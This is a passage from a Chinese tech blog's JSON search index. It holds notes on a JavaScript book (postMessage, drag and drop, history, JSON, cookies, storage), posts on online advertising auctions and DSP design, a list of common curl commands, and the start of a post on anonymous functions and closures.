\nXDM的核心是postMessage()方法。对于XDM而言，就是将信息发送至包含在当前页面中的iframe元素，或者由当前页面弹出的窗口。这个方法接受两个参数，一个消息字符串和一个表示消息接受方来自哪个域的字符串。如果内嵌框架的来源不符合参数，则什么也不做，传递“＊”代表匹配所有文档。\nvar iframeWindow = document.getElementById(\"myframe\").contentWindow; iframeWindow.postMessage(\"A secret\", \"http://www.wrox.com\");\n原生拖放拖放事件通过拖放事件，可以控制拖放相关的各个方面，其中最关键的地方在于确定那里发生了拖放事件，有些事件是在被拖动的元素上产生的，有些是在放置目标上触发的。拖动某元素时将依次在被拖动的元素上触发下列事件：\n\ndragstart：按下鼠标且鼠标移动开始时\ndrag：在元素被拖动的过程中持续触发\ndragend：当拖动停止时，无论把元素放到有效的放置目标上还是无效的上，都会触发dragend事件。\n\n在拖动的过程中，被拖动的元素的外观是可以改变的，一般浏览器会默认创建一个半透明的副本，这个副本始终跟随光标移动。当某个元素被放置到有效的放置目标的时候，下列事件会在放置目标会依次发生：\n\ndragenter：元素被拖动到放置目标上，就回触发一次dragenter\ndragover：元素在放置目标上继续被拖动时，会持续触发这个事件\ndragleave或drop：如果元素又被拖离了目标范围，触发dragleave，dragover事件不再触发，如果直接放置在了目标中，会触发drop事件。\n\n自定义放置目标所有元素都支持放置目标事件，但有些元素是默认不允许放置的，如果拖动元素经过不允许放置的的元素，是不会触发drop事件的，重写其dragenter和dragover事件可以使其变为可放置的：EventUtil.addHandler(dropDiv, \"dragover\", function(event){    EventUtil.preventDefault(event);});EventUtil.addHandler(dropDiv, \"dragenter\", function(event){    EventUtil.preventDefault(event);});EventUtil.addHandler(dropDiv, \"drop\", function(event){    alert(\"droped\");});\ndataTransfer对象为了在拖放操作时实现数据的交换，引入了dataTransfer对象(25章也有这个示例)，这是事件对象的一个属性，这个对象有两个方法：getData()和 setData()。这两个方法都需要一个代表数据类型的参数，在HTML5中，这个是MIME类型，为了向后兼容，还可以是”text”和”URL”，只不过他们其实是被映射为MIME类型”text/plain”和”text/uri-list”。setData还需要一个对应的数据作为参数。在这个对象中，对不同的MIME可以同时存储多个值。这个对象只在drop事件中读取。setData在拖动开始时设置，拖动文本，链接或图像时，浏览器会自动调用这个方法保存文字或URL。我们自己也可以在dragstart事件中调用来保存我们自己的数据。getData在drop事件中调用，获取相关数据。event.dataTransfer.setData(\"URL\", \"http://www.wrox.com/\");var url = dataTransfer.getData(\"url\")||dataTransfer.getData(\"text/uri-list\");\ndropEffect与effectAllowed利用dataTransfer对象，不光能传送数据，还能确定被拖动元素以及作为放置目标的元素能够接收什么操作。dropEffect属性可以知道被拖动元素能执行哪种放置行为：\n\nnone\nmove\ncopy\nlink这个属性要在开始拖动ondragstart时设置 \n\neffectAllowed表示允许拖动元素的哪种dropEffect。\n\nuninitialized\nnone\ncopy\nlink\nmove\ncopyLink\ncopyMove\nlinkMove\nall\n\n这个也要在ondragstart时设置\n可拖动&lt;div draggable=\"true\"&gt;...&lt;/div&gt;\n其他成员HTML5规范规定dataTransfer对象还有下列方法和属性:\n\naddElement(element)\nclearData(format)\nsetDragImage(element, x, y)\ntypes\n\n媒体元素新增audio /video标签\n属性略\n事件略\n自定义媒体播放器其实就是利用pause/play/currentTime等相关属性方法来封装一个播放器\n检测编解码器的支持情况利用canPlayType方法来检测是否支持某种MIME类型的媒体:if(audio.canPlayType('audio/mpeg')){ //返回'probably'/'maybe'、'' 三个值之一\t//...}\nAudio类型audio类型有一个元素JS的构造函数Audio,可以在任何时候播放音频, 并且: 通过 new Audio创建的实例不必插入到文档中就可以播放.\n历史状态管理在现在的Web应用中，用户的每次操作并不一定会打开一个新的页面，前进和后退按钮在这里也就失去了作用。HTML5通过更新history对象为管理历史状态提供了方便。 \nhashchange事件可以知道URL的参数什么时候发生了变化，这时使用history.pushState()可以在不加载新页面的情况下改变浏览器的URL，该方法接收3个参数：状态对象，新状态的标题和可选的相对URL。\nhistory.pushState({name:\"Nicholas\"}, \"Nicholas' page\", \"nicholas.html\");\n这个方法执行后，新的状态会被加入历史状态栈，浏览器的地址栏也会变成新的相对URL。但其实并没有像服务器发送数据。其中的第一个参数是用来初始化这个页面的数据用的。 \n这时后退按钮就能使用了，这时点击后退按钮会触发window对象的popstate事件，这个事件有个属性叫state，就是pushState的第一个参数。回到上一个页面，读取上一个页面的state来初始化上一个页面。比如你回到的是nicholas.html，那你读到的state的name就是Nicholas。浏览器加载的第一个页面木有状态，其state是null。还有个方法是replaceState()这个方法接收pushState的前两个参数，重写当前状态，不在历史栈中创建新状态。history.replaceState({name:\"Greg\"}, \"Greg's page\");\n这时以后再返回这个页面读到的state.name就是Greg了。要注意，push进去的每个状态服务器上都要有个真的页面，要不一刷新就404了。按照逻辑这个pushState应该是在每个web页面刚加载时就push进去，把初始化这个页面的每个数据一起push进去。在当前页面如果有什么即时的修改在下次进入这个页面也该体现的，就使用replaceState。\n\n本章完","url":"/2019/04/09/JSbook16/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook16/"},{"title":"JS红皮书读书笔记-19-E4X(略)","content":"本章节内容不常用，只列出大纲，有兴趣自行查阅\n\nE4X的类型XML类型XMLList类型Namespace类型Qname类型一般用法访问特性其他节点类型查询构建和操作XML解析和序列化命名空间其他变化全面启用E4X","url":"/2019/04/09/JSbook19/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook19/"},{"title":"JS红皮书读书笔记-20-JSON","content":"在很早一段时间, XML才是WEB开发首选的数据结构, 但是JSON的出现改变了这个事实, 相比XML, JSON更加简洁, 逻辑清晰, 读取信息的时候, 也不必创建DOM对象. 所以当下JSON是web开发最流行的数据格式.\n语法JSON 的语法可以表示以下三种类型的值。\n\n简单值：使用与 JavaScript 相同的语法，可以在 JSON 中表示字符串、数值、布尔值和 null。但 JSON 不支持 JavaScript 中的特殊值 undefined。\n对象：对象作为一种复杂数据类型，表示的是一组无序的键值对儿。而每个键值对儿中的值可 以是简单值，也可以是复杂数据类型的值。\n数组：数组也是一种复杂数据类型，表示一组有序的值的列表，可以通过数值索引来访问其中 的值。数组的值也可以是任意类型 简单值、对象或数组。\n\nJSON 不支持变量、函数或对象实例，它就是一种表示结构化数据的格式，虽然与 JavaScript 中表示数据的某些语法相同，但它并不局限于 JavaScript 的范畴。\n简单值数值/布尔值/字符串/null 四种\n对象JSON对象和JS对象字面量稍有不同, JSON对象的字段, 必须并且只能用双引号括起来.\n这个是JS对象字面量:var obj = {\tname: 'testdog',\tage: 18}\n这个是JSON对象:{\t\"name\": \"testdog\",\t\"age\": 18,\t\"school\":{\t\t\"name\":\"ABC\",\t\t\"addr\":\"China\"\t}}\nJSON是不能有注释的, 最后的字段末尾不能有逗号\n数组略, 语法注意事项同上\n解析与序列化JSON对象JSON 之所以流行，拥有与 JavaScript 类似的语法并不是全部原因。更重要的一个原因是，可以把JSON 数据结构解析为有用的 JavaScript 对象。与 XML 数据结构要解析成 DOM 文档而且从中提取数据极为麻烦相比，JSON 可以解析为 JavaScript 对象的优势极其明显。早期的 JSON 解析器基本上就是使用 JavaScript 的 eval()函数。由于 JSON 是 JavaScript 语法的子集，因此 eval()函数可以解析、解释并返回 JavaScript 对象和数组。对于较早版本的浏览器，可以使用一个 shim：https://github.com/douglascrockford/JSON-js。在旧版本的浏览器中，使用 eval()对 JSON 数据结构求值存在风险，因为可能会执行一些恶意代码。对于不能原生支持 JSON 解析的浏览器，使用这个 shim 是最佳选择。\nJSON 对象有两个方法：stringify()和 parse()。在最简单的情况下，这两个方法分别用于把JavaScript 对象序列化为 JSON 字符串和把 JSON 字符串解析为原生 JavaScript 值。\n例如: 将js对象转化成JSON字符串var book = {  title: \"Professional JavaScript\",   authors: [  \"Nicholas C. Zakas\"  ],  edition: 3,  year: 2011};var jsonText = JSON.stringify(book);\n默认情况下，JSON.stringify()输出的 JSON 字符串不包含任何空格字符或缩进，因此保存在 jsonText 中的字符串如下所示：{\"title\":\"Professional JavaScript\",\"authors\":[\"Nicholas C. Zakas\"],\"edition\":3, \"year\":2011}``` 在序列化 JavaScript 对象时，所有函数及原型成员都会被有意忽略，不体现在结果中。此外，值为undefined 的任何属性也都会被跳过。结果中最终都是值为有效 JSON 数据类型的实例属性。将 JSON 字符串直接传递给 JSON.parse()就可以得到相应的 JavaScript 值。例如，使用下列代码就可以创建与 book 类似的对象：``` jsvar bookCopy = JSON.parse(jsonText);\n注意，虽然 book 与 bookCopy 具有相同的属性，但它们是两个独立的、没有任何关系的对象。如果传给 JSON.parse()的字符串不是有效的 JSON，该方法会抛出错误。\n序列化选项JSON.stringify一共有三个参数:var book = {  \"title\": \"Professional JavaScript\", \"authors\": [  \"Nicholas C. Zakas\"  ],  edition: 3,  year: 2011};// 第一个参数自然是要被序列化的对象, 第二个参数可以是一个数组或者说函数,第三个参数是一个缩进选项var jsonText = JSON.stringify(book, [\"title\", \"edition\"]);//这里的第二个参数是一个数组, 代表一个过滤器, 返回 {\"title\":\"Professional JavaScript\",\"edition\":3}// 这里的第二个参数是一个函数var jsonText2 = JSON.stringify(book, function(key, value){   switch(key){    case \"authors\":    return value.join(\",\")    case \"year\":    return 5000;    case \"edition\": \t\treturn undefined;    default:    return value;  }});// jsonText2返回: {\"title\":\"Professional JavaScript\",\"authors\":\"Nicholas C. Zakas\",\"year\":5000} , 注意这里是没有\"edition\"这个字段, 因为它值为undefined, 被过滤了.var jsonText3 = JSON.stringify(book, null, 4);//jsonText3返回的格式缩进就带4个空格\n还有一个补充JSON.stringify的方法, toJSON, 讲解略.\n解析选项JSON.parse()方法也可以接收另一个参数，该参数是一个函数，将在每个键值对儿上调用。为了区别  JSON.stringify()接收的替换（过滤）函数（replacer），这个函数被称为还原函数（reviver），但实际上这两个函数的签名是相同的    它们都接收两个参数，一个键和一个值，而且都需要返回一个值。\n如果还原函数返回 undefined，则表示要从结果中删除相应的键；如果返回其他值，则将该值插入到结果中。在将H期字符串转换为 Date 对象时，经常要用到还原函数。例如：\nvar book = {  \"title\": \"Professional JavaScript\", \"authors\": [  \"Nicholas C. Zakas\"  ],  edition: 3,  year: 2011,  releaseDate: new Date(2011, 11, 1)};var jsonText = JSON.stringify(book);var bookCopy = JSON.parse(jsonText, function(key, value){   if (key == \"releaseDate\"){    return new Date(value);  } else {    return value;  }});alert(bookCopy.releaseDate.getFullYear());\n\n本章完","url":"/2019/04/09/JSbook20/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook20/"},{"title":"JS红皮书读书笔记-17-错误处理与程序","content":"浏览器报告的错误写此文时chrome已经成了市场主流浏览器(可见百度浏览器统计数据), 书中讲的浏览器版本比较旧也比较多, 这里不再讲解, 大家以chrome为标准即可.\n错误处理try-catch-finallytry{    //...} catch(error){   console.log(error);}finally {\t// 一定会执行的代码}\n抛出错误与 try-catch 语旬相配的还有一个 throw 操作符，用于随时抛出自定义错误。抛出错误时，必须要给 throw 操作符指定一个值，这个值是什么类型，没有要求。下列代码都是有效的。throw 12345;throw \"Hello world!\"; throw true;throw { name: \"JavaScript\"};\n在遇到 throw 操作符时，代码会立即停止执行。仅当有 try-catch 语旬捕获到被抛出的值时，代码才会继续执行\n错误事件任何没有通过 try-catch 处理的错误都会触发 window 对象的 error 事件。在任何 Web 浏览器中，onerror 事件处理程序都不会创建 event 对象， 但它可以接收三个参数：错误消息、错误所在的 URL 和行号。多数情况下，只有错误消息有用，因为URL 只是给出了文档的位置，而行号所指的代码行既可能出自嵌入的 JavaScript 代码，也可能出自外部的文件。要指定 onerror 事件处理程序，必须使用如下所示的 DOM0 级技术，它没有遵循“DOM2 级事件＂的标准格式。window.onerror = function(message, url, line){   alert(message);};\n常见错误类型错误处理的核心，是首先要知道代码里会发生什么错误。由于 JavaScript 是松散类型的，而且也不会验证函数的参数，因此错误只会在代码运行期间出现。一般来说，需要关注三种错误：\n\n类型转换错误\n数据类型错误\n通信错误\n\n\n本章完","url":"/2019/04/09/JSbook17/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook17/"},{"title":"JS红皮书读书笔记-18-JavaScript与XML(略)","content":"JS红皮书读书笔记-18-JavaScript与XML\n\n本章节内容不常用，只列出大纲，有兴趣自行查阅\n\n浏览器对XML DOM的支持DOM2级核心DOMParser类型XMLSerializer类型IE8及之前版本的XML跨浏览器处理XML浏览器对XPath的支持DOM3级的XPathIE中的XPath跨浏览器使用XPath浏览器对XSLT的支持IE中的XSLTXSLTProcessor类型跨浏览器使用XSLT","url":"/2019/04/09/JSbook18/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook18/"},{"title":"JS红皮书读书笔记-24-最佳实践","content":"可维护性可维护性并不是js专有, 其他语言也有这么个说法, 可维护性最大的价值是让别人更好的在你代码的基础上维护和增减功能\n什么是可维护的代码通常写入注释是为了让其他人更好地看懂自己写了啥, 不过我相信一条原则, 写的好的代码, 本身就是注释, 可维护的代码有以下几个特征: \n\n可理解: 容易被理解\n直观:  直观可读\n可适应: 代码以一种数据上的变化不需要完全重写原来的方法\n可扩展: 在某种程度上考虑到将来要用到的功能\n可调试\n\n代码约定团队开发中通常约定代码风格, 例如缩进, 换行, 变量/函数命名大小写等, 注意不要起令人困惑或者没有意义的变量名, 也无需担心变量名过长, 因为可压缩.\n松散耦合\n解耦HTML/JS: 尽可能避免在html元素中直接写js\n解耦Css/JS: 尽可能不要用js设置css\n解耦JS逻辑: 每一个函数尽可能实现单一的功能(按照最小化分离原则)\n\n编程实践\n尊重对象所有权: \n不要修改默认类型的属性和方法\n不要定义自己存在的方法\n\n\n避免全局对象: 前面作用域链也讲过, 全局作用域中保存的变量是最后查找的\n尽量避免和null对比: 应该用更具体的类型或者实例进行对比\n使用常量: 在ES5中我们用大写标识符表示常量\n\n性能注意作用域\n避免全局查找\n避免with语句: with设计的目的是为了简写某个对象, 方便开发者操作属性, 但是这非常容易造成作用域混乱\n\n选择正确方法\n避免不必要的属性查找: 在计算机科学中，算法的复杂度是使用 O 符号来表示的。最简单、最快捷的算法是常数值即 O(1)。之后，算法变得越来越复杂并花更长时间执行。 使用变量和数组要比访问对象上的属性更有效率，后者是一个 O(n)操作。对象上的任何属性查找都要比访问变量或者数组花费更长时间，因为必须在原型链中对拥有该名称的属性进行一次搜索。简而言之，属性查找越多，执行时间就越长。所以有必要, 就缓存某一个常用的值.\n 下面这个表展示算法复杂度种类:\n\nO(1) : 不管有多少值，执行的时间都是恒定的。一般表示简单值和存储在变量中的值\nO(log n): 总的执行时间和值的数量相关，但是要完成算法并不一定要获取每个值。例如：二分查找 \nO(n) : 总执行时间和值的数量直接相关, 例如: 遍历某个数据中的所有元素\nO(n^2) : 总执行时间和值的数量有关, 每个值至少获取n次, 例如:插入排序\n\n\n优化循环\n展开循环\n避免双重解释\n其他注意事项\n原生方法最快 \nswitch比一系列的的if-else要快\n位运算符比较快\n\n\n\n最小化语句\n多个变量声明: 可以使用一个var\n插入迭代值 (个人认为可读性会降低)\n使用数组和对象字面量: 简洁明了\n\n优化DOM交互\n最小化现场更新: 优先使用document.createFragment\n使用innerHTML创建元素更快\n事件代理: 使用事件代理可以减少事件绑定, 提高性能\n注意HTMLCollcetion: 循环的时候不要用它作为终止条件\n\n部署书上使用的一些工具比较旧, 所以不打算在这里讲解, 之后另开一篇文章\n\n本章完","url":"/2019/04/09/JSbook24/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook24/"},{"title":"JS红皮书读书笔记-23-离线应用与客户端存储","content":"保持离线 Web 应用开发是 HTML5 的另一个重点。所谓离线 Web 应用，就是在设备不能上网的情况下仍然可以运行的应用。\n开发离线 Web 应用需要几个步骤。首先是确保应用知道设备是否能上网，以便下一步执行正确的操作。然后，应用还必须能访问一定的资源（图像、JavaScript、CSS 等），只有这样才能正常工作。最后，必须有一块本地空间用于保存数据，无论能否上网都不妨碍读写。HTML5 及其相关的 API 让开发离线应用成为现实。\n离线检测HTML5提供了这个API检测设备是否离线:\nvar isOn = navigator.onLine;\t// true or false\n除 navigator.onLine 属性之外，为了更好地确定网络是否可用，HTML5 还定义了两个事件：online 和 offline。当网络从离线变为在线或者从在线变为离线时，分别触发这两个事件。这两个事件在 window 对象上触发。// 只有网络状况发生变化的时候才会触发以下事件windw.addEventListener(\"online\", function(){   console.log(\"Online\");});windw.addEventListener(\"offline\", function(){   console.log(\"Offline\");}\n应用缓存看 这篇文章能够更清晰了解html5 appcache\n数据存储CookieCookie最初是用来在客户端储存会话信息的。该标准要求服务器对任意HTTP请求发送Set-Cookie HTTP头作为相应的一部分，其中包含会话的信息。例如：HTTP/1.1 200 OKContent-type: text/htmlSet-Cookie: name=valueOther-header: other-header-value\n这里就设置了一个以name为名称，value为值的一个cookie。浏览器会储存这样的会话信息。并在这之后通过为每一个请求添加Cookie HTTP头部将信息发送回服务器：GET /index.html HTTP/1.1Cookie: name=valueOther-header: other-header-value\n这个信息对于服务器来说就可以唯一验证请求的身份\n限制cookie在性质上是绑定在特定域名下的。当设定了一个cookie，再给创建它的域名发送请求时都会包含这个cookie，而发向其他域的请求中并不会包含这个cookie。这个限制保证了cookie只能让批准的接受者访问。每个域的cookie总数是有限的，各浏览器不同，最小的规定一个域有30个cookie，大小一般不超过4095B。cookie的构成cookie由浏览器保存的一下几块信息构成：\n\n名称：一个唯一确定cookie的名称\n值：储存在cookie中的字符串值\n域：这个cookie对哪个域有效，如果这个域包含子域，那对子域同样有有效。如果设定是没有明确指定，这个值会被认为是设置cookie的那个域\n路径：用于指定向域中的哪个路径发送cookie，例如，你可以指定cookie只发送到www.baidu.com/img，那再访问www.baidu.com时就不会发送cookie。及时它们同域\n失效时间：cookie应该被删除的时间戳，默认浏览器会话结束就删除\n安全标志：指定后，cookie只有在使用SSL连接时才会发送到服务器\n\n看例子:HTTP/1.1 200 OKContent-type: text/htmlSet-Cookie: name=value; expires=Mon, 22-Jan-07 07:10:24 GMT; domain=.wrox.com path=/; secureOther-header: other-header-value\nJS中的cookie可以通过document.cookie返回如下格式的字符串:document.cookie;\t//name1=value1;name2=value2;name3=value3\njs中设置删除cookie不是很好操作, 我给出一个封装好的demo:var CookieUtil = {  get: function (name){    var cookieName = encodeURIComponent(name) + \"=\",      cookieStart = document.cookie.indexOf(cookieName),      cookieValue = null;    if (cookieStart &gt; -1){      var cookieEnd = document.cookie.indexOf(\";\", cookieStart);      if (cookieEnd == -1){        cookieEnd = document.cookie.length;      }      cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd));    }    return cookieValue;  },  set: function (name, value, expires, path, domain, secure) {    var cookieText = encodeURIComponent(name) + \"=\" +      encodeURIComponent(value);    if (expires instanceof Date) {      cookieText += \"; expires=\" + expires.toGMTString();    }    if (path) {      cookieText += \"; path=\" + path;    }    if (domain) {      cookieText += \"; domain=\" + domain;    }    if (secure) {      cookieText += \"; secure\";    }    document.cookie = cookieText;  },  unset: function (name, path, domain, secure){    this.set(name, \"\", new Date(0), path, domain, secure);  }};CookieUtil.set(\"book\", \"Professional JavaScript\");console.log(CookieUtil.get(\"book\"));CookieUtil.unset(\"book\");console.log(CookieUtil.get(\"book\"));\n子Cookie子Cookie方案的提出实际上是为了避免单域名对cookie个数的限制, 它的思想就是在单个cookie中存更多的名值对, 不过写这个笔记的时候, 市场上的主流是现代浏览器(谷歌内核), 没有单域名cookie个数限制, 这里不再讲解.\n关于Cookie的一些说明\n\ncookie存储的数据不宜过多: 信息越多, 后端响应越慢\n不要存敏感信息, 否则XSS泄露麻烦\n\nIE用户数据略, 不要用\nWeb存储机制目前来说主要是localStorage和sessionStorage. 书中有些内容以及不适合现在, 看 这个例子更简洁 \nIndexDB/WebSQL书上只介绍了indexDB , 我们看 这篇文章 , 更加直观介绍两种方案.","url":"/2019/04/09/JSbook23/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook23/"},{"title":"计算广告系列-竞拍模式","content":"开篇前言这是我写计算广告系列的第一篇, 以记录学习心得.\n拍卖的定义\n 拍卖（Auction），是人类社会相对特殊的商品交易方式，通常是以公开竞价的形式，将特定物品或者财产权利转让给最高应价者的买卖方式。\n而在经济学中，拍卖有着更深层次的意义，其理论基础来源于信息经济学和博弈论的核心思想，即认为拍卖本身是一个博弈的过程，因而可以通过现代经济学的方法对传统的拍卖方法的效率作出评估，同时也可以设计出新的拍卖方法。\n\n常见拍卖类型\n英国式拍卖法：最常见的拍卖方式，竞标者出价由下往上喊，喊价最高者得标，竞标者可多次重复提高出价。\n荷兰式拍卖法：创于荷兰的郁金香拍卖场而得名，卖方由高往低喊价，过程中如有人愿意购买，此价即为成交价。\n第一密封价格拍卖法：密封投标金额，投标者只能出价一次，开标时最高价者得标并依价付款。\n第二密封价格拍卖法：最高价者得标，但依次高价付款即可，此种拍卖方法在拍卖进行时通常不会透露最高价竞标者开的价钱；以避免有意人士的恶作剧或者是拍卖会上的报复行为（例如恶意缩小最高价与次高价的差距），不过竞标价者想出价几次都行，但此种拍卖法会有垄断商品（故意喊巨额的价钱，使其他竞标者无法得标）的行为发生。\n\n广告与竞标既然你是本文的读者, 那我相信你肯定听说过央视广告竞标的事情, 从1994年开始, 央视开始竞标广告, 当年”孔府宴酒”以3079万拿下95年标王头衔, 此后的竞标不断刷新着普罗大众对”天价广告费”的认知.\n\n央视广告竞标\n\n当然还有一个年代比较近的例子-2016年papi酱视频广告竞拍出2200万元的高价, 标王为丽人丽妆.\n\npapi酱广告拍卖\n\n为什么厂商愿意投入巨额广告费?\n\n简单粗暴的说, 就是这些平台(例如上两个例子)带货能力强, 能给厂商带来更高的利润.\n\n虽然广告对普通人的体验, 通常可以归结为”令人讨厌”, 比如你看电视的时候, 老是要暂停播广告, 比如你看网页的时候, 老是阻碍你点错. 你讨厌归讨厌, 但这不妨碍你对这些广告产生了印象(无论好坏). 更何况, 有些广告有不是这么糟糕, 以至于你会对某个品牌产生好感.\n表面上央视和papi酱都是拍卖广告, 但是实际上背后存在着传统电视广告和自媒体广告的巨大差异.\n至于广告是如何经过一系列发展, 而产生这些巨大差异, 后续还会在公众号陆续更新.\n其他下一篇会讲解广告的一些基本概念\n欢迎关注我的公众号: 测试狗","url":"/2019/03/14/auction/","link":"","plink":"https://thinkerchan.com/2019/03/14/auction/"},{"title":"计算广告系列-广告相关的基本概念","content":"广告定义什么是广告?\n\n广告的本质是一种商业行为, 其作用在于规劝视/阅/听人产生一些列的关注或者购买行为, 从而产生利益或者关注度. 无论是否以营利作为目标, 符合上述特征的行为, 我们都可以视为广告.\n\n\n涉及人群广告活 动的两个主动参与方:出资人(sponsor) 和媒体(medium)。在数字广告复杂的市场结构中，我们 可以用更一般性的术语来述它们:需求方(Demand)和供给方(Supply)。\n\n需求方: 通常是广告主, 也可以是代表广告主利益的代理商\n供给方: 通常是媒体平台\n观众: 被动接受者\n\n传统广告VS在线广告通常传统广告以四大媒体展现, 也就是杂志/报纸/广播/电视这四种.他们的优点有下:\n\n传播量大, 读者观众听众多, 对于品牌传播有优势\n能粗略划分群体(不同杂志报纸订阅人群特征不一致)\n受众主动性强(主动订阅/收听/收视)\n\n但是它们不具备以下几个非常重要的能力:\n\n时效性(例如无法更新)\n精准投放\n转化率预估\n\n这就意味着广告主在传统媒体的许多预算都会被浪费掉, 并且还不知道浪费在哪里.\n而在线广告具备上述几点非常重要能力. 所以很明显广告主在在线广告的投入比重越来越高.\n广告种类从功能角度来分析,主要有这两种\n\n品牌广告: 短期时间内, 广告主并不在意广告带来的利润转换, 而是在意品牌知名度的提高\n效果广告: 广告主希望短期内能带来大量的购买行为\n\n在线广告类型主要有以下集中\n\n横幅(banner)\n文字链(textual ad)\n富文本(rich media ad): 例如微信H5小游戏\n视频广告(video ad): 视频开场, 暂停时候显示\n社交广告(social ad): 例如微博信息流插入\n移动设备广告: 还记得被戏称为Adui的Miui吗?\n邮件营销\n\n实际上信息形式本身, 也有可能就是广告. 例如一篇你看到背后才想起它是软文的文章, 又例如某数字产品本身(不信你思考一下小众点评/某利网等等)\n其他通常普罗大众对广告的第一印象就是令人讨厌, 但其实这是一种自我偷换概念的行为. 他们讨厌的不是广告本身, 而是广告不和时宜的干扰. 这种干扰, 一般产生于用户在某平台行为上的中断, 又或者是广告质量本身太低而造成用户产生抵触情绪. 我相信你或多或少都听说过泰国广告, 如果用户看的电视广告有这种水准, 我相信用户还是会很接受并且喜欢的.\n\n下一篇会讲解在线广告的发展简史\n欢迎关注我的公众号: 测试狗","url":"/2019/03/15/basicofad/","link":"","plink":"https://thinkerchan.com/2019/03/15/basicofad/"},{"title":"计算广告系列-设计一个简单的DSP","content":"本文是从产品的角度来探讨如何搭建一个DSP投放平台，介绍DSP投放的内部模块都有哪些。但本文不涉及RTB（Real Time Bidding）、eCPM预估等技术层面的介绍。\n\nDSP什么是DSP？\nDSP就是需求方平台（Demand Side Platform），本质是把广告主的广告通过媒体投放到受众（消费者）的面前。DSP平台对接了主流的ADX，并且把广告位的具体的概念，改变成了受众的人群。也就是说，DSP提供的不是广告位，是目标受众。DSP平台提供多样的人群标签（例如性别、年龄、地理位置、手机类型、兴趣爱好等），使得广告主能够以人群的维度，去投放广告。本质而言，DSP是为广告主服务的。\n\nDSP怎么赚钱？\n如图所示，每个DSP需要去对接多个ADX（广告交易平台），把多个ADX中的库存对接起来。\n\n\n完整的计算广告链\n\n\n对于DSP而言，他们需要的是一个利差。假设广告主愿意为每个点击支付一个价格，那么如果DSP能够通过利差带来更多的收益，DSP就能有收入，从而发展起来。可以简单的理解为，DSP就是一个流量贩子，但不是DSP先买流量，而是广告主先需要给定一个价格，DSP再拿着这个价格去市场上看，有没有符合这个价格且还有利差的流量。如果广告主出12元，DSP能在市场上找到10元就能满足广告主需求的流量，那么对于DSP而言，剩下的2元就是他的收入。DSP一般赚取10%-20%左右的利差（数据来源于艾瑞咨询的《2016年中国移动营销行业研究报告》）\nDSP的核心竞争力/主要功能是什么？一个产品要有竞争力，一定是满足了用户的需求，这个原则是不会变的，那么对于DSP而言，核心的竞争力就是：精准营销的能力。只有掌握了足够多的数据的DSP，才能真正做到人群的细分，达到按照人群来投放的目的。通过定向技术，可以定位到非常精确的人群，比如游戏的广告主通过DSP平台进行投放的时候，就可以选择，上海，18-24岁，对游戏感兴趣的人这种人群。\n搭建DSP投放平台一个DSP投放平台的工作原理如下：1）广告主创建投放计划、投放单元，设置投放条件，上传创意（一个计划对应多个单元，一个单元对应多个创意）；2）ADX发现有用户符合广告主符合DSP的投放条件且有广告位时，向DSP发送请求，询问DSP的出价；3）DSP根据eCPM的预估出价，想ADX报出自己所处的价位；4）ADX对比多个DSP的报价，把广告位留给出价最高的DSP，并调用该DSP的广告创意进行展示；\nDSP投放平台的主要使用者为需求方，也就是我们理解的广告主或者广告代理商。对于整理的产品逻辑而言，是很简单的。注册→登录→设置投放计划（本次广告投放总计划，比如新上一款商品要推广）→设置投放单元（本次投放的类型，推广方式等）→设置投放条件（选择需要投放的人群）→设置投放创意（选择不同的图片，文字创意）→系统按照投放的设置的各种条件进行广告竞价投放→查看投放效果→优化投放创意→继续投放。\n那么基于这个产品逻辑，其实可以把整个产品的用户任务勾画出来。\n\n产品结构框架\nDSP功能\n\n\n\n注册模块：有注册和登录两个功能，一般使用DSP都需要以企业的方式去申请，而且一般不开放注册。\n工作台模块：用于企业方便的查看自己的广告投放的效果。投放管理模块：用户可以管理投放计划、投放单元、创意。\n统计报表：用户可以根据不同的时间条件，查看投放计划、投放单元、创意的数据信息。\n其他：包括素材管理，定向包管理，预算提醒的工具。\n\n注意事项因为本文是从产品设计的角度去看DSP投放平台的设计，所以不涉及DSP的自动投放的技术模块，eCPM的预估价格模块等，对于搭建DSP平台的产品人员而言，需要了解DSP的投放原理，但是具体的技术实现，则需要交给专业的技术人员了。","url":"/2019/03/17/designadsp/","link":"","plink":"https://thinkerchan.com/2019/03/17/designadsp/"},{"title":"常用CURL命令","content":"常用curl命令读取网页\n$ curl https://baidu.com\n\n保存文件\n$ curl https://baidu.com &gt; baidu.html\n\n  或者\n\n$ curl https://baidu.com -o baidu.html\n\n代理模式\n$ curl -x 123.45.67.89:1080  https://baidu.com &gt; baidu.html\n\n存储cookie\n$ curl https://baidu.com &gt; baidu.html -D cookie.txt\n\n使用cookie\n$ curl https://baidu.com &gt; baidu.html -D cookie.txt -b readcookie.txt\n\n添加UserAgent\n$ curl -A “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)”  https://www.baidu.com\n\n添加referer\n$ curl -A “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)” -e “index.baidu.com”  https://www.baidu.com\n\n参考参考来源","url":"/2018/11/13/curl/","link":"","plink":"https://thinkerchan.com/2018/11/13/curl/"},{"title":"墙内Chrome插件下载方法","content":"chrome应用商店内下载插件有时候是直接就安装在chrome中,与我们有时候想下crx的意愿相违背, 尽管可以用开发者模式导出插件(然而我并不喜欢这样做,光是找文件夹都耗时间…)遂从网上找到两个不错的资源,给广大墙内用户提供方便\n镜像网址http://www.crx4chrome.com/\n直接在搜索框里面搜索就Ok了\nID下载http://chrome-extension-downloader.com/\n每个chrome插件都提供了一个的id , 如:\n\n只需将这个Id输入http://chrome-extension-downloader.com/里的搜索框下载即可.","url":"/2016/01/11/download-chrome-crx/","link":"","plink":"https://thinkerchan.com/2016/01/11/download-chrome-crx/"},{"title":"匿名函数, 闭包, eval劫持","content":"匿名函数普通写法//这里的匿名函数加了一个括号 其实最外面那个括号加不加都一样var a =(function(arg){     //a() --&gt; 执行了函数本身,于是console.log;    var a1 = 1;    console.log(\"a外层函数执行\");    return function(){     //a()() --&gt; 执行 &lt;到&gt; 内部的匿名函数 返回了a1    return a1;    }})\n立即执行的匿名函数//这里的匿名函数加了一个括号var b =(function(arg){    var a2 = 2;    console.log(\"b外层函数执行\");    return function(){    